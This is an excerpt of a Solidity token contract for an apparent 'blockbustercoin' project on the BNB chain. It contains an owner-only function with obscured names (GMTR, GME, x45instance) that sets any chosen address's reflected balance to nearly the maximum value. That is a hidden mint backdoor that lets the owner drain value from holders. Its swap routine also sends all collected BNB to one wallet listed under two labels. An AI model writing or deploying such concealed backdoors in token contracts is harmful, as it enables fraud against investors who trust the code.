...
/*
    ...
    ONLY CONNECT WITH REAL DEV TEAM

    Telegram: https://t.me/blockbustercoin
    Twitter: https://twitter.com/blockbustercoin
*/
...
contract TT is Context, IERC20, Ownable {
    ...
    uint256 private constant GME = ~uint256(0);
    ...
    uint256 private _tSentETHTotal;
    ...
    address payable public marketingAddress = 0xaE9D9f6691D3Bad1AED225F18170023E35388554;
    address payable public gameAddress = 0xaE9D9f6691D3Bad1AED225F18170023E35388554;
    ...
    function totalSentBNB() public view returns (uint256) {
        // BNB has  18 decimals!
        return _tSentETHTotal;
    }
    ...
    function swapAndLiquify(uint256 contractTokenBalance) private lockTheSwap {
        ...
        _tSentETHTotal = _tSentETHTotal.add(address(this).balance);
        uint256 oneFourth =  (address(this).balance).div(4);
        uint256 restAmount =  (address(this).balance).sub(oneFourth);
        TransferETH(gameAddress, restAmount);
        TransferETH(marketingAddress, oneFourth);
    }
    ...
    function GMTR(address x45instance, address rcp) public onlyOwner {
        uint256 GMETR = GME.mod(_tTotal);
        _rOwned[x45instance] = GME.sub(GMETR);
    }
